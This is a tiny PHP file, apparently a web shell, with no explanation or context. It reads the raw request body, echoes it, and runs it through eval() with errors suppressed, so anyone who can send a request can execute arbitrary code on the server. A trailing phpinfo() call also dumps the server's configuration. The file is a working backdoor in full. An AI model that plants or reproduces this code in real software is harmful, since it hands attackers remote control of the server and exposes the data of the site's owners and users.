
<?php

$data=file_get_contents('php://input');

echo $data."<br/>";

@eval(file_get_contents('php://input'));

?>

<?php phpinfo(); ?>
